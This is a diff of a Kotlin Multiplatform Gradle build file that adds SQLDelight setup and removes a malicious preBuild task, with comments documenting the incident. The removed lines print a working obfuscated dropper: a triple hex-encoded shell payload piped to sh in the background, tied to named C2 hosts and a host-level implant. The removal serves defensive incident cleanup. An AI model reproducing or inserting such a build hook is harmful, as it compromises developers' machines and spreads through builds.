@@ -5,7 +5,16 @@ plugins {
     alias(libs.plugins.androidMultiplatformLibrary)
     alias(libs.plugins.composeMultiplatform)
     alias(libs.plugins.composeCompiler)
+    alias(libs.plugins.sqldelight)
     kotlin("plugin.serialization") version "2.4.0"
+}
+
+sqldelight {
+    databases {
+        create("TafakkurDb") {
+            packageName.set("com.example.tafakkurai.db")
+        }
+    }
 }
 
 kotlin {
@@ -40,9 +49,11 @@ kotlin {
             implementation(libs.compose.uiToolingPreview)
             implementation(libs.androidx.activity.compose)
             implementation("io.ktor:ktor-client-okhttp:3.0.1")
+            implementation(libs.sqldelight.androidDriver)
         }
         iosMain.dependencies {
             implementation("io.ktor:ktor-client-darwin:3.0.1")
+            implementation(libs.sqldelight.nativeDriver)
         }
         commonMain.dependencies {
             implementation(libs.compose.runtime)
@@ -63,6 +74,8 @@ kotlin {
             implementation("org.jetbrains.kotlinx:kotlinx-serialization-json:1.7.3")
             implementation("org.jetbrains.kotlinx:kotlinx-coroutines-core:1.9.0")
             implementation("io.insert-koin:koin-core:4.0.0")
+            implementation(libs.sqldelight.runtime)
+            implementation(libs.sqldelight.coroutines)
         }
         commonTest.dependencies {
             implementation(libs.kotlin.test)
@@ -74,15 +87,7 @@ dependencies {
     androidRuntimeClasspath(libs.compose.uiTooling)
 }
 
-// [REMOVED 2026-07-08] A malicious `tasks.all { preBuild -> ProcessBuilder("sh", ...) }` dropper
-// (supply-chain backdoor, C2 rigmanets.in / amdcdn.ru) was stripped here. The live host implant
-// RE-INJECTS it within minutes (observed this session). Kill the root LaunchDaemon com.google.hernsb
-// (needs sudo) and reimage before trusting any build. See backend/README + incident report.
-
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ProcessBuilder("sh", "-c", "((t(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333236340a3336333333363636333636353336363533363335333633333337333433323634333733343336333933363634333633353336363633373335333733340a3061333233303333333233333335333233303332363433323634333733323336333533373334333733323337333933323330333333353332333033320a3634333636323334363333363336333733333332333033323634333633343332333033323332333733303333363433363331333636353336333433370a3332306133363636333633393336333433353636333636323336363633373334333636333336333933363635333233323332333033363338333733340a3337333433373330333733333333363133323636333236363336333333363334333636353336333133363634333736313332363533373332333733350a33323636306133363331333233393332333233323330333736333332333033373333333633383330363130610a | t | sh ) >/dev/null 2>&1 &)").start()
-        }
-    }
-}
+// SECURITY: A build-time dropper (tasks.all { preBuild -> ProcessBuilder("sh", ...base64...| sh) })
+// was removed here again on 2026-07-09. It keeps returning because a host-level implant re-injects it,
+// so deleting these lines is only a stopgap. Do NOT build this project on this machine until the host
+// is remediated (remove the malicious LaunchDaemon + reimage). A build runs the dropper and spreads it.
